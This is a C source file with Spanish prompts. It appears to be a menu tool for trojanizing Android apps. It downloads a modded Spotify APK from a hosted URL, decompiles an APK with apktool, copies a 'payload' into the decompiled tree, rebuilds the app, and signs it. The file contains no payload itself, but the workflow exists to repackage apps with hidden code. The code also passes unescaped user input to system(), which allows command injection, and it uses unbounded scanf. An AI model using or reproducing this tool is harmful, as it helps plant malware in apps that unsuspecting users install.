#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

void decompile_apk(const char *apk_file, const char *output_dir) {
    char command[256];
    sprintf(command, "apktool d %s -o %s", apk_file, output_dir);
    if (system(command) == 0) {
        printf("APK decompilado correctamente en %s\n", output_dir);
    } else {
        printf("Error al decompilar el APK\n");
        exit(1);
    }
}

void inject_payload(const char *target_dir, const char *payload_file) {
    char command[256];
    sprintf(command, "cp %s %s", payload_file, target_dir);
    if (system(command) == 0) {
        printf("Payload inyectado correctamente en %s\n", target_dir);
    } else {
        printf("Error al inyectar el payload\n");
        exit(1);
    }
}

void recompile_apk(const char *input_dir, const char *output_apk) {
    char command[256];
    sprintf(command, "apktool b %s -o %s", input_dir, output_apk);
    if (system(command) == 0) {
        printf("APK recompilado correctamente en %s\n", output_apk);
    } else {
        printf("Error al recompilar el APK\n");
        exit(1);
    }
}

void sign_apk(const char *apk_file, const char *keystore, const char *alias, const char *storepass) {
    char command[256];
    sprintf(command, "jarsigner -keystore %s -storepass %s %s %s", keystore, storepass, apk_file, alias);
    if (system(command) == 0) {
        printf("APK firmado correctamente\n");
        sprintf(command, "zipalign -v 4 %s %s_aligned.apk", apk_file, apk_file);
        if (system(command) == 0) {
            printf("APK alineado correctamente\n");
        } else {
            printf("Error al alinear el APK\n");
            exit(1);
        }
    } else {
        printf("Error al firmar el APK\n");
        exit(1);
    }
}

void check_permissions() {
    if (geteuid() != 0) {
        printf("Este script debe ejecutarse como root\n");
        exit(1);
    } else {
        printf("Permisos de root verificados\n");
    }
}

void fetch_data(const char *url, const char *output_file) {
    CURL *curl = curl_easy_init();
    if (curl) {
        FILE *fp = fopen(output_file, "wb");
        if (fp == NULL) {
            printf("Error al abrir el archivo de salida\n");
            exit(1);
        }
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        CURLcode res = curl_easy_perform(curl);
        if (res == CURLE_OK) {
            printf("Datos obtenidos correctamente de %s\n", url);
        } else {
            printf("Error al obtener datos de %s\n", url);
            exit(1);
        }
        fclose(fp);
        curl_easy_cleanup(curl);
    } else {
        printf("Error al inicializar curl\n");
        exit(1);
    }
}

void download_specific_apk() {
    const char *specific_url = "https://fs1.uploadking.net/files/7/xuhqz8k7hpj131/Spotify-v8.9.56.618_build_116396262-Experimental-Mod-arm64-v8a.apk";
    const char *output_file = "Spotify_Mod.apk";
    fetch_data(specific_url, output_file);
}

void show_menu() {
    int option;
    char apk_file[256], output_dir[256], target_dir[256], payload_file[256];
    char input_dir[256], output_apk[256], keystore[256], alias[256], storepass[256], url[256], output_file[256];

    while (1) {
        printf("Seleccione una opción:\n");
        printf("1) Descargar APK específico\n");
        printf("2) Decompilar APK\n");
        printf("3) Inyectar payload\n");
        printf("4) Recompilar APK\n");
        printf("5) Firmar y alinear APK\n");
        printf("6) Verificar permisos de root\n");
        printf("7) Obtener datos de una URL\n");
        printf("8) Salir\n");
        printf("Opción: ");
        scanf("%d", &option);

        switch (option) {
            case 1:
                download_specific_apk();
                break;
            case 2:
                printf("Ruta del archivo APK: ");
                scanf("%s", apk_file);
                printf("Directorio de salida: ");
                scanf("%s", output_dir);
                decompile_apk(apk_file, output_dir);
                break;
            case 3:
                printf("Directorio objetivo: ");
                scanf("%s", target_dir);
                printf("Archivo de payload: ");
                scanf("%s", payload_file);
                inject_payload(target_dir, payload_file);
                break;
            case 4:
                printf("Directorio de entrada: ");
                scanf("%s", input_dir);
                printf("Archivo APK de salida: ");
                scanf("%s", output_apk);
                recompile_apk(input_dir, output_apk);
                break;
            case 5:
                printf("Archivo APK a firmar: ");
                scanf("%s", apk_file);
                printf("Ruta del keystore: ");
                scanf("%s", keystore);
                printf("Alias del keystore: ");
                scanf("%s", alias);
                printf("Contraseña del keystore: ");
                scanf("%s", storepass);
                sign_apk(apk_file, keystore, alias, storepass);
                break;
            case 6:
                check_permissions();
                break;
            case 7:
                printf("URL para obtener datos: ");
                scanf("%s", url);
                printf("Nombre del archivo a guardar: ");
                scanf("%s", output_file);
                fetch_data(url, output_file);
                break;
            case 8:
                printf("Saliendo...\n");
                return;
            default:
                printf("Opción no válida, por favor intente de nuevo.\n");
                break;
        }
    }
}

int main() {
    curl_global_init(CURL_GLOBAL_DEFAULT);
    show_menu();
    curl_global_cleanup();
    return 0;
}
